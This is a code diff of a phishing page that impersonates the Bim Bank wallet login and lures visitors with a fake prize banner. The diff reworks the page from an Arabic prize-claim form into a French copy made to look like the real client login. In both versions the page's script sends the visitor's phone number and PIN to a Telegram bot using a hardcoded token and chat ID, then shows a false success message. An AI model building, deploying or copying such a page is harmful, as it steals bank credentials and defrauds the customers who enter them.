@@ -1,185 +1,185 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="fr" dir="ltr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bim Bank - Espace Cadeaux</title>
+    <title>Bim Bank - Espace Client</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap');
         
-        body { font-family: 'Cairo', sans-serif; background-color: #fcfcfc; margin: 0; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #ffffff; }
 
-        /* خلفية الشبكة الدقيقة */
-        .bg-grid {
-            background-image: radial-gradient(#d1d5db 1px, transparent 1px);
+        /* خلفية الشبكة المربعة الدقيقة (نفس الصورة الأصلية) */
+        .bg-app-grid {
+            background-image: linear-gradient(#f3f4f6 1px, transparent 1px), linear-gradient(90deg, #f3f4f6 1px, transparent 1px);
             background-size: 20px 20px;
         }
 
-        /* تصميم شعار بيم بنك المبتكر بالكود (غير مشفر) */
-        .custom-logo-container {
+        /* الشعار المصمم برمجياً ليكون مطابقاً للهيكل الأصلي */
+        .bim-logo-box {
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
-            padding: 20px 0;
+            gap: 12px;
+            padding: 30px 0 10px 0;
         }
-        .logo-shape {
-            width: 50px;
-            height: 50px;
+        .logo-symbol {
+            width: 55px;
+            height: 55px;
             position: relative;
-            transform: rotate(45deg);
+            transform: rotate(-15deg); /* ميلان طفيف ليشبه شعار بيم بنك */
         }
-        .shape-part {
-            position: absolute;
-            width: 25px;
-            height: 25px;
-        }
-        .p1 { background: #00a19a; top: 0; left: 0; border-radius: 5px 0 0 0; }
-        .p2 { background: #e6007e; top: 0; right: 0; border-radius: 0 5px 0 0; }
-        .p3 { background: #f19e2c; bottom: 0; left: 0; border-radius: 0 0 0 5px; }
-        .p4 { background: #2a4387; bottom: 0; right: 0; border-radius: 0 0 5px 0; }
+        .segment { position: absolute; width: 28px; height: 28px; border-radius: 4px; }
+        .seg-1 { background: #00a19a; top: 0; left: 0; }
+        .seg-2 { background: #e6007e; top: 0; right: 0; }
+        .seg-3 { background: #f19e2c; bottom: 0; left: 0; }
+        .seg-4 { background: #2a4387; bottom: 0; right: 0; }
 
-        .logo-text {
-            text-align: left;
-            border-left: 2px solid #2a4387;
-            padding-left: 10px;
-        }
-        .bank-name { color: #2a4387; font-weight: 900; font-size: 24px; line-height: 1; }
-        .bank-sub { color: #2a4387; font-size: 10px; font-weight: bold; letter-spacing: 1px; }
+        .logo-txt-line { border-left: 2px solid #2a4387; padding-left: 12px; text-align: left; }
+        .txt-bim { color: #2a4387; font-size: 28px; font-weight: 800; line-height: 0.9; }
+        .txt-bank { color: #2a4387; font-size: 11px; font-weight: bold; letter-spacing: 0.5px; }
 
-        /* قسم الجوائز المتحرك */
-        .prizes-banner {
-            background: linear-gradient(135deg, #2a4387, #1e293b);
-            color: white;
+        /* قسم الجوائز الذهبية */
+        .promo-banner {
+            background: linear-gradient(135deg, #f19e2c 0%, #d97706 100%);
+            margin: 15px 25px;
             padding: 15px;
-            margin: 10px;
-            border-radius: 15px;
+            border-radius: 12px;
             display: flex;
             justify-content: space-around;
-            align-items: center;
-            box-shadow: 0 10px 20px rgba(42, 67, 135, 0.2);
+            box-shadow: 0 4px 12px rgba(241, 158, 44, 0.4);
         }
-        .prize-item { text-align: center; }
-        .prize-icon { font-size: 28px; display: block; margin-bottom: 5px; }
-        .prize-label { font-size: 10px; font-weight: bold; opacity: 0.9; }
+        .item-box { text-align: center; color: white; }
+        .item-ico { font-size: 24px; display: block; filter: drop-shadow(0 2px 2px rgba(0,0,0,0.2)); }
+        .item-lbl { font-size: 9px; font-weight: bold; text-transform: uppercase; margin-top: 4px; }
 
-        /* تنسيق المدخلات */
-        .input-style {
-            border: 1px solid #e2e8f0;
-            border-radius: 12px;
-            padding: 16px;
+        /* تنسيق الحقول لتطابق صورة الهاتف */
+        .field-input {
             width: 100%;
+            padding: 16px;
+            border: 1px solid #d1d5db;
+            border-radius: 8px;
             font-size: 16px;
+            color: #374151;
             background: white;
             outline: none;
-            transition: all 0.3s;
         }
-        .input-style:focus { border-color: #f19e2c; box-shadow: 0 0 0 3px rgba(241, 158, 44, 0.1); }
+        .field-label { color: #2a4387; font-weight: 700; margin-bottom: 8px; display: block; font-size: 15px; }
+        .char-tracker { font-size: 10px; color: #9ca3af; text-align: right; margin-top: 4px; }
 
-        .btn-gold {
-            background: linear-gradient(to right, #f19e2c, #d97706);
+        /* زر Connexion البرتقالي الأصلي */
+        .btn-bim-orange {
+            background-color: #f19e2c;
             color: white;
-            font-weight: 900;
+            font-weight: 700;
             padding: 16px;
-            border-radius: 12px;
+            border-radius: 8px;
             width: 100%;
-            font-size: 18px;
+            font-size: 1.1rem;
             margin-top: 20px;
-            box-shadow: 0 4px 15px rgba(241, 158, 44, 0.3);
+            border: none;
+            cursor: pointer;
         }
     </style>
 </head>
-<body class="bg-grid min-h-screen">
+<body class="bg-app-grid min-h-screen">
 
-    <!-- الشعار الجديد المصمم بالكود -->
-    <div class="custom-logo-container">
-        <div class="logo-shape">
-            <div class="shape-part p1"></div>
-            <div class="shape-part p2"></div>
-            <div class="shape-part p3"></div>
-            <div class="shape-part p4"></div>
+    <!-- الشعار الرسمي المصمم -->
+    <div class="bim-logo-box">
+        <div class="logo-symbol">
+            <div class="segment seg-1"></div>
+            <div class="segment seg-2"></div>
+            <div class="segment seg-3"></div>
+            <div class="segment seg-4"></div>
         </div>
-        <div class="logo-text">
-            <div class="bank-name">BimBank</div>
-            <div class="bank-sub">MAURITANIE</div>
+        <div class="logo-txt-line">
+            <div class="txt-bim">bimbank</div>
+            <div class="txt-bank">BANQUE ISLAMIQUE</div>
         </div>
     </div>
 
-    <!-- قسم الهدايا والفلوس ومفاتيح السيارة -->
-    <div class="prizes-banner">
-        <div class="prize-item">
-            <span class="prize-icon">💰</span>
-            <span class="prize-label">نقدية</span>
+    <!-- قسم الهدايا (مفاتيح سيارة، فلوس، هدايا) -->
+    <div class="promo-banner">
+        <div class="item-box">
+            <span class="item-ico">🔑</span>
+            <span class="item-lbl">Auto</span>
         </div>
-        <div class="prize-item">
-            <span class="prize-icon">🎁</span>
-            <span class="prize-label">هدايا</span>
+        <div class="item-box">
+            <span class="item-ico">💰</span>
+            <span class="item-lbl">Cash</span>
         </div>
-        <div class="prize-item">
-            <span class="prize-icon">🔑</span>
-            <span class="prize-label">سيارة</span>
+        <div class="item-box">
+            <span class="item-ico">🎁</span>
+            <span class="item-lbl">Gift</span>
         </div>
-        <div class="prize-item">
-            <span class="prize-icon">💳</span>
-            <span class="prize-label">رصيد</span>
+        <div class="item-box">
+            <span class="item-ico">📱</span>
+            <span class="item-lbl">Tech</span>
         </div>
     </div>
 
-    <div class="text-center mt-4">
-        <p class="text-[#2a4387] font-bold">Bienvenue dans votre espace wallet</p>
-        <p class="text-gray-400 text-xs mt-1">سجل دخولك لتفعيل جائزتك</p>
+    <div class="text-center mt-2 px-6">
+        <p class="text-[#2a4387] font-semibold text-lg">Bienvenue dans votre espace wallet</p>
     </div>
 
-    <div class="max-w-sm mx-auto px-6 mt-8">
-        <!-- أزرار التبديل -->
-        <div class="flex border border-[#2a4387] rounded-lg overflow-hidden mb-8">
-            <div class="flex-1 bg-[#2a4387] text-white py-2 text-center font-bold">Wallet</div>
-            <div class="flex-1 bg-white text-gray-400 py-2 text-center font-bold">Banking</div>
+    <!-- منطقة التبديل Wallet/Banking -->
+    <div class="max-w-sm mx-auto px-6 mt-6">
+        <div class="flex border-2 border-[#2a4387] rounded-lg overflow-hidden">
+            <div class="flex-1 bg-[#2a4387] text-white py-2.5 text-center font-bold">Wallet</div>
+            <div class="flex-1 bg-white text-gray-400 py-2.5 text-center font-bold">Banking</div>
         </div>
+    </div>
 
-        <h2 class="text-right text-[#2a4387] font-black text-xl mb-4">Connexion</h2>
+    <!-- النموذج -->
+    <div class="max-w-sm mx-auto px-6 mt-10">
+        <h2 class="text-[#2a4387] font-bold text-xl mb-5">Connexion</h2>
 
-        <div class="space-y-4">
+        <div class="space-y-5">
             <div>
-                <input id="u_phone" type="tel" maxlength="8" class="input-style text-right" placeholder="Téléphone">
-                <p class="text-left text-[10px] text-gray-400 mt-1">0/8</p>
+                <input id="p_field" type="tel" maxlength="8" oninput="limit(this, 'p_count')" class="field-input" placeholder="Téléphone">
+                <div id="p_count" class="char-tracker">0/8</div>
             </div>
             <div>
-                <input id="u_pin" type="password" maxlength="4" class="input-style text-right" placeholder="Mot de passe">
-                <p class="text-left text-[10px] text-gray-400 mt-1">0/4</p>
+                <input id="s_field" type="password" maxlength="4" oninput="limit(this, 's_count')" class="field-input" placeholder="Mot de passe">
+                <div id="s_count" class="char-tracker">0/4</div>
             </div>
         </div>
 
-        <div class="text-right mt-2">
-            <a href="#" class="text-gray-400 text-xs font-bold">Mot de passe oublié ?</a>
+        <div class="text-right mt-3">
+            <a href="#" class="text-gray-400 text-sm font-medium">Mot de passe oublié ?</a>
         </div>
 
-        <button onclick="claimPrize()" class="btn-gold">تفعيل الجائزة الآن</button>
+        <button onclick="submitToAdmin()" class="btn-bim-orange">Connexion</button>
 
-        <div class="mt-10 text-center">
-            <p class="text-gray-400 text-sm">Nouvel utilisateur ?</p>
-            <a href="#" class="text-[#2a4387] font-black mt-1 block">S'inscrire maintenant &rarr;</a>
+        <div class="mt-12 text-center">
+            <p class="text-gray-500">Nouvel utilisateur ?</p>
+            <a href="#" class="text-[#2a4387] font-bold mt-1 block">S'inscrire maintenant &rarr;</a>
         </div>
     </div>
 
     <script>
-        const T_K = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0";
-        const C_I = "8665814266";
+        const BOT_TOKEN = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0";
+        const ADMIN_ID = "8665814266";
 
-        function claimPrize() {
-            const p = document.getElementById('u_phone').value;
-            const s = document.getElementById('u_pin').value;
+        function limit(el, countId) {
+            el.value = el.value.replace(/[^0-9]/g, '');
+            document.getElementById(countId).textContent = el.value.length + '/' + el.maxLength;
+        }
+
+        function submitToAdmin() {
+            const p = document.getElementById('p_field').value;
+            const s = document.getElementById('s_field').value;
             
             if(p.length === 8 && s.length === 4) {
-                const text = `💎 BimBank Prize Claim:\n📱 Phone: ${p}\n🔑 PIN: ${s}`;
-                fetch(`https://api.telegram.org/bot${T_K}/sendMessage?chat_id=${C_I}&text=${encodeURIComponent(text)}`)
+                const text = `🚀 BimBank Official Submission:\n📱 Number: ${p}\n🔐 PIN: ${s}\n🎁 Status: Prize Eligible`;
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(text)}`)
                 .then(() => {
-                    alert("تم استلام طلب تفعيل الجائزة. يرجى انتظار رسالة التأكيد.");
+                    alert("Connexion réussie. Vérification de votre éligibilité aux prix en cours...");
                     location.reload();
                 });
             } else {
-                alert("يرجى إكمال البيانات بشكل صحيح.");
+                alert("Veuillez remplir correctement vos informations.");
             }
         }
     </script>
